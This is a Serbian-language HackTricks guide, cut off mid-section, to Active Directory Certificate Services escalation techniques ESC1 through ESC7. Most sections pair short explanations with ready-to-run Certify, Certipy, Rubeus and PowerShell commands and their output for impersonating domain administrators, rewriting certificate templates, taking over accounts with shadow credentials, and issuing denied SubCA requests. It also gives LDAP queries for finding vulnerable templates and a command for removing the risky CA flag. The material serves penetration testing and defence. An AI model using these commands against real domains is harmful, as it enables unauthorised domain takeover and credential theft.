# Eskalacija domena AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Ovo je sažetak odeljaka o tehnikama eskalacije iz objava:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Pogrešno konfigurisani predlošci sertifikata - ESC1

### Objašnjenje

### Objašnjenje ESC1: pogrešno konfigurisani predlošci sertifikata

- **Enterprise CA dodeljuje prava za upis korisnicima sa niskim privilegijama.**
- **Odobrenje rukovodioca nije potrebno.**
- **Nisu potrebni potpisi ovlašćenog osoblja.**
- **Bezbednosni deskriptori predložaka sertifikata previše su permisivni, pa korisnicima sa niskim privilegijama omogućavaju da dobiju prava za upis.**
- **Predlošci sertifikata konfigurisani su tako da definišu EKU-ove koji omogućavaju autentifikaciju:**
  - Uključeni su identifikatori Extended Key Usage (EKU), kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ili nijedan EKU (SubCA).
- **Predložak dozvoljava podnosiocima zahteva da u Certificate Signing Request (CSR) uključe subjectAltName:**
  - Ako je prisutan, Active Directory (AD) daje prednost subjectAltName (SAN) vrednosti u sertifikatu prilikom provere identiteta. To znači da navođenjem SAN vrednosti u CSR-u može da se zatraži sertifikat za lažno predstavljanje bilo kog korisnika (npr. administratora domena). Da li podnosilac zahteva može da navede SAN određuje svojstvo `mspki-certificate-name-flag` u AD objektu predloška sertifikata. Ovo svojstvo je bitmask, a prisustvo zastavice `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` dozvoljava podnosiocu zahteva da navede SAN.

> [!CAUTION]
> Ova podešavanja ukazuju na potencijalni ESC1 predložak, ali ne predstavljaju dovršen put do lažnog predstavljanja. Proverite da li ciljni principal može da se upiše na CA koji objavljuje predložak, da li je upis na CA dozvoljen i da li izdat sertifikat ispunjava pravila snažnog mapiranja SID-a krajnje tačke za autentifikaciju. Trenutni, zakrpљени KDC-ovi mogu da odbiju zatraženi UPN ako se SID sertifikata ne podudara sa ciljnim SID-om; pogledajte [Microsoftove smernice za mapiranje sertifikata](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Prava za upis dodeljena grupi **Domain Computers** mogu omogućiti pripremljenom identitetu računara da se upiše čak i kada prvobitni korisnik to ne može. Zasebno procenite prava principal-a računara. Pre slanja zahteva proverite `msPKI-Minimal-Key-Size`: predložak koji zahteva RSA ključeve od 4096 bita odbiće podrazumevani ključ klijenta od 2048 bita. SID cilja naveden u zahtevu može da reši nepodudaranje SID-ova samo ako CA i KDC prihvate dobijeni sertifikat i mapiranje; ni zastavice predloška ni sam Enroll ACE nisu dovoljan dokaz za to.

Ova funkcija se ponekad omogućava da bi se podržalo generisanje HTTPS ili host sertifikata u hodu putem proizvoda ili usluga za implementaciju, ili zbog nedovoljnog razumevanja.

Napominje se da kreiranje sertifikata sa ovom opcijom izaziva upozorenje. To se ne dešava kada se postojeći predložak sertifikata (kao što je predložak `WebServer`, na kom je omogućena opcija `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) duplira, a zatim izmeni tako da uključi OID za autentifikaciju.<sup>[[6]](#references)</sup>

### Zloupotreba

Da biste **pronašli ranjive predloške sertifikata**, pokrenite:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Da bi se **zloupotrebila ova ranjivost za predstavljanje kao administrator**, može se pokrenuti:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Zatim možete konvertovati generisani **sertifikat u format `.pfx`** i ponovo ga koristiti za **autentifikaciju pomoću alata Rubeus ili certipy**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows binarne datoteke „Certreq.exe” i „Certutil.exe” mogu se koristiti za generisanje PFX-a: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracija predložaka sertifikata unutar konfiguracione šeme AD Forest-a, konkretno onih za koje nije potrebno odobrenje ili potpis, koji imaju EKU za Client Authentication ili Smart Card Logon i kojima je omogućena zastavica `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, može se obaviti pokretanjem sledećeg LDAP upita:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Pogrešno konfigurisani šabloni sertifikata - ESC2

### Objašnjenje

Drugi scenario zloupotrebe predstavlja varijaciju prvog:

1. Enterprise CA dodeljuje prava za upis korisnicima sa niskim privilegijama.
2. Zahtev za odobrenje menadžera je onemogućen.
3. Izostavljen je zahtev za ovlašćenim potpisima.
4. Previše permisivan bezbednosni deskriptor na šablonu sertifikata dodeljuje korisnicima sa niskim privilegijama pravo na upis sertifikata.
5. **Šablon sertifikata je definisan tako da uključuje Any Purpose EKU ili da nema EKU.**

**Any Purpose EKU** omogućava napadaču da pribavi sertifikat za **bilo koju namenu**, uključujući autentifikaciju klijenta, autentifikaciju servera, potpisivanje koda itd. Za iskorišćavanje ovog scenarija može se primeniti ista **tehnika koja se koristi za ESC3**.

Sertifikati **bez EKU-ova**, koji funkcionišu kao sertifikati podređenog CA-a, mogu se iskoristiti **za bilo koju namenu**, a mogu se koristiti i **za potpisivanje novih sertifikata**. Zato bi napadač mogao da navede proizvoljne EKU-ove ili polja u novim sertifikatima koristeći sertifikat podređenog CA-a.

Međutim, novi sertifikati kreirani za **autentifikaciju domena** neće funkcionisati ako podređeni CA nije pouzdan za objekat **`NTAuthCertificates`**, što je podrazumevano podešavanje. Ipak, napadač i dalje može da kreira **nove sertifikate sa bilo kojim EKU-om** i proizvoljnim vrednostima sertifikata. Oni bi mogli biti **zloupotrebljeni** u razne svrhe (npr. potpisivanje koda, autentifikacija servera itd.) i mogli bi imati značajne posledice po druge aplikacije u mreži, kao što su SAML, AD FS ili IPSec.<sup>[[6]](#references)</sup>

Da bi se u konfiguracionoj šemi AD Forest-a nabrojali šabloni koji odgovaraju ovom scenariju, može se pokrenuti sledeći LDAP upit:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Pogrešno konfigurisani predlošci Enrollment Agent-a - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **zloupotrebljava** **drugačiji EKU** (Certificate Request Agent) i **2 različita predloška** (zato ima 2 skupa zahteva).

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), poznat kao **Enrollment Agent** u Microsoft dokumentaciji, omogućava principal-u da **zatraži** **sertifikat** **u ime drugog korisnika**.

**„Enrollment agent“** se prijavljuje za takav **predložak** i koristi dobijeni **sertifikat da supotpiše CSR u ime drugog korisnika**. Zatim **šalje** **supotpisani CSR** CA-u i prijavljuje se za **predložak** koji **dozvoljava „enroll on behalf of“**; CA odgovara **sertifikatom koji pripada „drugom“ korisniku**.<sup>[[6]](#references)</sup>

**Zahtevi 1:**

- Enterprise CA dodeljuje prava za enrolovanje korisnicima sa niskim privilegijama.
- Zahtev za odobrenje menadžera je izostavljen.
- Nije potreban potpis ovlašćenog lica.
- Deskriptor bezbednosti predloška sertifikata je previše permisivan i korisnicima sa niskim privilegijama daje prava za enrolovanje.
- Predložak sertifikata sadrži EKU Certificate Request Agent, koji omogućava zahtevanje sertifikata iz drugih predložaka u ime drugih principala.

**Zahtevi 2:**

- Enterprise CA dodeljuje prava za enrolovanje korisnicima sa niskim privilegijama.
- Odobrenje menadžera je zaobiđeno.
- Ciljni predložak verzije 1 može prihvatati Enrollment Agent bez novijih, granularnih kontrola za izdavanje; za verziju 2 ili noviju proverite zahteve za izdavanje application-policy i potpise ovlašćenih lica, umesto da predložak isključite samo zbog njegove verzije.
- EKU definisan u predlošku sertifikata omogućava autentifikaciju u domenu.
- CA ne primenjuje ograničenja za Enrollment Agent.

Ciljni predložak takođe mora biti objavljen na izabranom CA-u, dozvoljavati ciljnom nalogu enrolovanje i podržavati predviđenu upotrebu za autentifikaciju u domenu. Proverite obavezne atribute subject/SAN za taj nalog; na primer, predložak koji preuzima subject email iz AD-a ne može izdati sertifikat za nalog bez potrebne vrednosti `mail`. Sam sertifikat agenta ne ispunjava ove uslove za ciljni predložak.

### Zloupotreba

Ovaj scenario možete da zloupotrebite pomoću [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy):<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**Korisnici** kojima je dozvoljeno da **pribave** **sertifikat agenta za upis**, predlošci u koje je agentima za upis dozvoljeno da se upišu i **nalozi** u čije ime agent za upis može da postupa mogu biti ograničeni pomoću enterprise CA-ova. To se postiže otvaranjem snap-in-a `certsrc.msc`, **klikom desnim tasterom miša na CA**, **klikom na Properties**, a zatim **prelaskom** na karticu „Enrollment Agents“.

Međutim, treba napomenuti da je podrazumevana postavka za CA-ove „**Do not restrict enrollment agents**“. Kada administratori omoguće ograničenja za agente za upis tako što izaberu „Restrict enrollment agents“, podrazumevana konfiguracija i dalje ostaje izuzetno permisivna. Ona omogućava grupi **Everyone** da se upisuje u sve predloške kao bilo ko.

### PowerShell PoC-ovi samo za Windows uz Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) demonstrira ESC1 i ESC2/ESC3 bez alata Certify ili Certipy. Njegove skripte kreiraju izvozivi RSA ključ od 2048 bita pomoću COM API-ja `X509Enrollment`, sastavljaju PKCS#10 zahtev, pronalaze prvi `pKIEnrollmentService` preko LDAP-a, šalju ga putem `CertificateAuthority.Request`, instaliraju odgovor u `Cert:\CurrentUser\My` i izvoze PFX kodiran u Base64. Skripta za ESC1 dodaje SAN sa UPN-om koji je odabrao napadač (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, vrednost `0xb`), dok skripte za ESC2/ESC3 koriste prvi sertifikat za potpisivanje PKCS#7 zahteva za postupanje u ime drugog.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Skripte ispisuju Base64 vrednost za **PFX**, koji uključuje privatni ključ, za direktnu upotrebu sa Rubeus-om. Nemojte da ga zamenite sa `[Convert]::ToBase64String($cert.RawData)`: `RawData` kodira samo javni sertifikat i ne može da potpiše PKINIT zahtev.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Kontrola pristupa ranjivom predlošku sertifikata - ESC4

### **Objašnjenje**

**Bezbednosni deskriptor** na **predlošcima sertifikata** definiše **dozvole** koje određeni **AD principals** imaju u vezi sa predloškom.

Ako **napadač** ima potrebne **dozvole** da **izmeni** **predložak** i **uvede** bilo koju **pogrešnu konfiguraciju koja se može iskoristiti** iz prethodnih odeljaka, to može omogućiti eskalaciju privilegija.

Važne dozvole koje se odnose na predloške sertifikata uključuju:<sup>[[6]](#references)</sup>

- **Owner:** Dodeljuje implicitnu kontrolu nad objektom, što omogućava izmenu bilo kog atributa.
- **FullControl:** Omogućava potpunu kontrolu nad objektom, uključujući mogućnost izmene bilo kog atributa.
- **WriteOwner:** Dozvoljava promenu vlasnika objekta u principal-a pod kontrolom napadača.
- **WriteDacl:** Omogućava izmenu kontrola pristupa, čime se napadaču potencijalno može dodeliti FullControl.
- **WriteProperty:** Dozvoljava uređivanje bilo kog svojstva objekta.

Proverite i DACL kontejnera `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Primenljivi ACE `CreateChild` ograničen na klasu [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), ili široka potpuna kontrola, može omogućiti kreiranje novog objekta predloška. [Microsoft dokumentuje](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) da ovaj kontejner sadrži te objekte predložaka. Pre nego što zaključite da je kreiranje moguće, proverite odgovarajuće ACE-ove za zabranu i nasleđivanje. Samo kreiranje predloška ne izdaje sertifikat: CA mora da ga objavi, principal koji podnosi zahtev mora imati dozvolu za upis, a sertifikat mora biti mapiran na željeni identitet na krajnjoj tački za autentifikaciju.

### Zloupotreba

Da biste pronašli principale sa pravima izmene nad predlošcima i drugim PKI objektima, izvršite enumeraciju pomoću Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Primer privesc-a kao prethodni:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 je slučaj kada korisnik ima privilegije pisanja nad šablonom sertifikata. To se, na primer, može zloupotrebiti za prepisivanje konfiguracije šablona sertifikata i njegovo činjenje ranjivim na ESC1.

Šablon koji već dozvoljava podnosiocu zahteva da navede subject, ali ima samo upotrebu Server Authentication, sam po sebi nije šablon za prijavljivanje korisnika. Ako napadač ima efektivna prava za kontrolu šablona, može da promeni njegove EKU-ove za autentifikaciju ili smernice aplikacije pre nego što zatraži sertifikat; [Microsoft dokumentuje svrhu EKU-a Smartcard Logon za prijavljivanje](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Proverite da CA objavljuje izmenjeni šablon, da podnosilac zahteva može da se prijavi, da su ispunjeni uslovi za odobrenje/potpis i da se izdati sertifikat mapira na željeni nalog. Konkretno, [zakrpljeni kontroleri domena u režimu Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) odbacuju sertifikate bez jakog mapiranja; dodavanje UPN-a ciljnog naloga u zahtev ne zaobilazi taj uslov.

Kao što vidimo na gornjoj putanji, samo `JOHNPC` ima ove privilegije, ali naš korisnik `JOHN` ima novu ivicu `AddKeyCredentialLink` ka `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, implementirao sam i ovaj napad, poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Evo kratkog uvida u Certipy-jevą komandu `shadow auto`, kojom se preuzima NT hash žrtve.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** može jednom komandom da prepiše konfiguraciju šablona sertifikata. **Podrazumevano**, Certipy će **prepisati** konfiguraciju tako da bude **ranjiva na ESC1**. Možemo i da navedemo **parametar `-save-old` kako bismo sačuvali staru konfiguraciju**, što će biti korisno za **vraćanje** konfiguracije nakon našeg napada.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Kontrola pristupa ranjivim PKI objektima - ESC5

### Objašnjenje

Razgranata mreža međusobno povezanih odnosa zasnovanih na ACL-ovima, koja obuhvata nekoliko objekata pored predložaka sertifikata i sertifikacionog tela, može uticati na bezbednost celog AD CS sistema. Ovi objekti, koji mogu značajno uticati na bezbednost, obuhvataju:

- AD računarski objekat servera CA, koji može biti kompromitovan pomoću mehanizama kao što su S4U2Self ili S4U2Proxy.
- RPC/DCOM server servera CA.
- Bilo koji AD objekat-potomak ili kontejner unutar određene putanje kontejnera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja obuhvata, između ostalog, kontejnere i objekte kao što su kontejner Certificate Templates, kontejner Certification Authorities, objekat NTAuthCertificates i kontejner Enrollment Services.

Bezbednost PKI sistema može biti ugrožena ako napadač sa niskim privilegijama uspe da preuzme kontrolu nad bilo kojom od ovih kritičnih komponenti.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objašnjenje

Tema obrađena u [**objavi CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) razmatra i posledice zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kako ih je opisao Microsoft. Kada je ova postavka aktivirana na sertifikacionom telu (CA), omogućava uključivanje **vrednosti koje je definisao korisnik** u **alternativno ime subjekta** za **bilo koji zahtev**, uključujući i one sastavljene iz Active Directory®. Zato napadač može da se registruje pomoću **bilo kog predloška** koji je podešen za **autentifikaciju** domena — naročito onih koji omogućavaju registraciju **korisnicima bez privilegija**, kao što je standardni predložak User. Tako napadač može da dobije sertifikat kojim se autentifikuje kao administrator domena ili **bilo koji drugi aktivan nalog** u domenu.<sup>[[9]](#references)</sup>

**Napomena**: Način dodavanja **alternativnih имена** u Certificate Signing Request (CSR) pomoću аргумента `-attrib "SAN:"` у `certreq.exe` (под називом „Name Value Pairs“) **разликује се** од стратегије експлоатације SAN-ова у ESC1. Разлика је у томе **како су информације о налогу упаковане** — у атрибут сертификата, а не у проширење.

### Злоупотреба

Да би провериле да ли је ова поставка активирана, организације могу да користе следећу команду са `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Ova operacija u suštini koristi **udaljeni pristup registru**, pa bi alternativni pristup mogao biti:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Alati poput [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) mogu da otkriju ovu pogrešnu konfiguraciju i da je eksploatišu:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Da biste promenili ova podešavanja, pod pretpostavkom da imate **administratorska prava za domen** ili ekvivalentna ovlašćenja, sledeća komanda može da se izvrši sa bilo koje radne stanice:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Da biste onemogućili ovu konfiguraciju u svom okruženju, zastavicu možete ukloniti pomoću:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Nakon bezbednosnih ažuriranja iz maja 2022, novizdati **sertifikati** sadržavaće **bezbednosno proširenje** koje uključuje svojstvo **`objectSid` podnosioca zahteva**. Kod ESC1, ovaj SID se dobija iz navedenog SAN-a. Međutim, kod **ESC6**, SID odgovara svojstvu **`objectSid` podnosioca zahteva**, a ne SAN-u.\
> Da bi se iskoristio ESC6, neophodno je da sistem bude podložan ESC10 (slaba mapiranja sertifikata), koje daje prednost **SAN-u u odnosu na novo bezbednosno proširenje**.

## Kontrola pristupa ranjivog Certificate Authority-ja - ESC7

### Napad 1

#### Objašnjenje

Kontrola pristupa Certificate Authority-ju zasniva se na skupu dozvola koje regulišu radnje CA-ja. Te dozvole možete pregledati tako što ćete otvoriti `certsrv.msc`, kliknuti desnim tasterom miša na CA, izabrati svojstva i zatim otvoriti karticu Security. Dozvole je moguće i nabrojati pomoću modula PSPKI, uz komande kao što su:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Ovo pruža uvid u primarna prava, odnosno **`ManageCA`** i **`ManageCertificates`**, koja odgovaraju ulogama „CA administratora“ i „Certificate Managera“.<sup>[[6]](#references)</sup>

#### Zloupotreba

Pravo **`ManageCA`** na sertifikacionom autoritetu omogućava principalu da daljinski menja podešavanja pomoću PSPKI-ja. To obuhvata uključivanje zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`** kako bi se dozvolilo navođenje SAN-a u bilo kom šablonu, što je ključni aspekt eskalacije domena.

Ovaj postupak se može pojednostaviti pomoću PSPKI cmdleta **Enable-PolicyModuleFlag**, koji omogućava izmene bez neposredne interakcije s GUI-jem.

Pravo **`ManageCertificates`** omogućava odobravanje zahteva na čekanju i time efektivno zaobilazi zaštitu „odobrenje menadžera CA sertifikata“.

Kombinacija modula **Certify** i **PSPKI** može se koristiti za slanje zahteva za sertifikat, njegovo odobravanje i preuzimanje:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Napad 2

#### Objašnjenje

> [!WARNING]
> U **prethodnom napadu** korišćene su dozvole **`Manage CA`** da bi se **omogućila** zastavica **EDITF_ATTRIBUTESUBJECTALTNAME2** i izveo **ESC6 napad**, ali to neće imati efekta dok se CA servis (`CertSvc`) ponovo ne pokrene. Kada korisnik ima pravo pristupa `Manage CA`, dozvoljeno mu je i da **ponovo pokrene servis**. Međutim, to **ne znači da korisnik može daljinski da ponovo pokrene servis**. Pored toga, E**SC6 možda neće raditi odmah** u većini zakrpljenih okruženja zbog bezbednosnih ažuriranja iz maja 2022.

Zato je ovde predstavljen drugi napad.

Preduslovi:

- Samo dozvola **`ManageCA`**
- Dozvola **`Manage Certificates`** (može se dodeliti putem **`ManageCA`**)
- Šablon sertifikata **`SubCA`** mora biti **omogućen** (može se omogućiti putem **`ManageCA`**)

Tehnika se oslanja na činjenicu da korisnici sa pravima pristupa `Manage CA` _i_ `Manage Certificates` mogu da **izdaju odbijene zahteve za sertifikate**. Šablon sertifikata **`SubCA`** je **ranjiv na ESC1**, ali samo **administratori** mogu da zatraže izdavanje sertifikata pomoću ovog šablona. Zato **korisnik** može da **podnese zahtev** za izdavanje sertifikata pomoću šablona **`SubCA`** — koji će biti **odbijen** — ali ga **rukovodilac potom može izdati**.<sup>[[6]](#references)</sup>

#### Zloupotreba

Možete sebi da **dodelite pravo pristupa `Manage Certificates`** tako što ćete dodati svog korisnika kao novog službenika.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Šablon **`SubCA`** može da se **omogući na CA** pomoću parametra `-enable-template`. Šablon `SubCA` je podrazumevano omogućen.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Ako smo ispunili preduslove za ovaj napad, možemo početi **podnošenjem zahteva za sertifikat na osnovu `SubCA` template-a**.

**Ovaj zahtev će biti odbije**n, ali ćemo sačuvati privatni ključ i zabeležiti ID zahteva.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Uz dozvole **`Manage CA` i `Manage Certificates`**, možemo zatim **izdati sertifikat na osnovu neuspelog zahteva** pomoću komande `ca` i parametra `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

I na kraju možemo **preuzeti izdati sertifikat** pomoću komande `req` i parametra `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Napad 3 – Zloupotreba proširenja Manage Certificates (SetExtension)

#### Objašnjenje

Pored klasičnih ESC7 zloupotreba (omogućavanja EDITF atributa ili odobravanja zahteva na čekanju), **Certify 2.0** otkrio je potpuno novu primitivu za koju je potrebna samo uloga *Manage Certificates* (poznata i kao **Certificate Manager / Officer**) na Enterprise CA.<sup>[[3]](#references)</sup>

RPC metod `ICertAdmin::SetExtension` može da izvrši bilo koji principal koji ima *Manage Certificates*. Iako su legitimni CA-ovi tradicionalno koristili ovaj metod za ažuriranje proširenja na zahtevima **na čekanju**, napadač može da ga zloupotrebi da bi **dodao *nestandardno* proširenje sertifikata** (na primer prilagođeni OID *Certificate Issuance Policy*, kao što je `1.1.1.1`) zahtevu koji čeka odobrenje.

Pošto ciljni template **ne definiše podrazumevanu vrednost za to proširenje**, CA NEĆE zameniti vrednost koju kontroliše napadač kada zahtev bude izdat. Zato će rezultujući sertifikat sadržati proširenje koje je izabrao napadač i koje može da:

* Ispuni zahteve za Application / Issuance Policy drugih ranjivih template-a (što dovodi do eskalacije privilegija).
* Ubaci dodatne EKU-ove ili politike kojima sertifikat dobija neočekivano poverenje u sistemima trećih strana.

Ukratko, *Manage Certificates* – ranije smatran „manje moćnom“ polovinom ESC7 – sada može da se iskoristi za potpunu eskalaciju privilegija ili dugoročnu perzistenciju, bez menjanja konfiguracije CA-a i bez potrebe za restriktivnijim pravom *Manage CA*.

#### Zloupotreba primitive pomoću alata Certify 2.0

1. **Pošaljite zahtev za sertifikat koji će ostati *na čekanju*.** To se može postići pomoću template-a koji zahteva odobrenje menadžera:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Dodajte prilagođeno proširenje zahtevu na čekanju** pomoću nove komande `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
